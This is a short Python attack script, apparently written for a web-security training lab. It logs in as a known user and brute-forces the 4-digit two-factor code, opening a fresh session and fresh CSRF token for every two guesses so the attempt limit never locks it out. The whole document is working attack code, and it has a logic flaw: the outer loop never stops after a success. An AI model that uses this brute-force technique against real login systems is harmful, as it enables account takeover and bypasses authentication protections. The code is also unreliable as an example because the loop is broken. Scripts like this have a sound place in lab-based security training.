import requests
from bs4 import BeautifulSoup
import random

LAB_URL = input("Enter the lab URL: ")

INITIAL_LOGIN = f"{LAB_URL}/login"
MFA = f"{LAB_URL}/login2"


auth_credentials = {
    "username": "carlos",
    "password": "montoya"
}


current_mfa = "0000"
while True:
    s = requests.Session()

    csrf_token = BeautifulSoup(s.get(INITIAL_LOGIN).text, "html.parser").find("input", {"name": "csrf"})["value"]
    auth_credentials["csrf"] = csrf_token
    r = s.post(INITIAL_LOGIN, data=auth_credentials)

    if "Please enter your 4-digit security code" in r.text:
        # print("Successfully logged in, now bypassing 2FA...")

        new_csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    

        mfa_data = {
            "csrf": new_csrf,
            "mfa-code": current_mfa
        }

        # only 2 attempts allowed before logout
        for attempt in range(2):
            mfa_response = s.post(MFA, data=mfa_data)
            if "Incorrect security code" in mfa_response.text:
                # print(f"Attempt {attempt + 1}: Invalid security code {generated_code}. Retrying...")
                new_csrf = BeautifulSoup(mfa_response.text, "html.parser").find("input", {"name": "csrf"})["value"]
                #append + 1
                current_mfa = str(int(current_mfa) + 1).zfill(4) 
                mfa_data["mfa-code"] = current_mfa
                mfa_data["csrf"] = new_csrf
            else:
                print("2FA bypass successful!")
                s.get(f"{LAB_URL}/my-account")
                break
 